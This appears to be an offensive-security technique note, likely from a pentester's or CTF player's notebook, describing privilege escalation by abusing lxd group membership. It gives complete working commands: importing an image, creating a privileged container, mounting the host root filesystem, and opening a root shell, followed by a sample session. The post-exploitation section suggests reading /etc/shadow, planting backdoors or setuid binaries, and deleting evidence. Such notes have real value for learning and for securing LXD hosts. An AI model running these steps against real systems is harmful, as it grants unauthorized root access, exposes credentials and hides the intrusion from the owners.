### 1. Technique Name:

LXC/LXD Container Escape via Privileged Container
### 2. Summary:

LXC (Linux Containers) and LXD (Linux Daemon) are OS-level virtualization technologies. LXD containers share the host kernel and can expose the host filesystem if misconfigured. If a user belongs to the `lxd` group, they can often initialize a privileged container and mount the host root filesystem into it, effectively escaping the container and escalating privileges to root.
### 3. Conditions / Requirements:

- Current user is in the `lxd` or `lxc` group    
- LXD is installed and running on the host
- Container image is present or can be imported
- Capable of initiating and configuring containers (`lxc init`, `lxc config`, `lxc start`, etc.)
### 4. Enumeration:
#### A. Check for group membership:

```bash
id
```

Look for `lxd` in the output groups.
#### B. Check if LXD is running:

```bash
which lxc
lxc list
```
#### C. Look for available or importable images:

```bash
ls
# e.g., ubuntu-template.tar.xz
```
### 5. Exploitation:
#### A. Import image (if available locally):

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```
#### B. Create and configure a privileged container:

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```
#### C. Mount host root filesystem into container:

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
#### D. Start container and escape:

```bash
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root
ls -la
```

Now you're operating inside the container as root and can directly interact with the host filesystem.
### 6. Post-Exploitation:

- Read sensitive files from the host (e.g., `/mnt/root/root/root.txt`, `/mnt/root/etc/shadow`)
- Upload backdoors or setuid binaries to the host
- Clean up evidence:

```bash
lxc delete privesc --force
lxc image delete ubuntutemp
```
### Example:

```bash
id
# uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash

cd /mnt/root
ls -l
# Now reading and modifying host files as root
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #LXD #LXC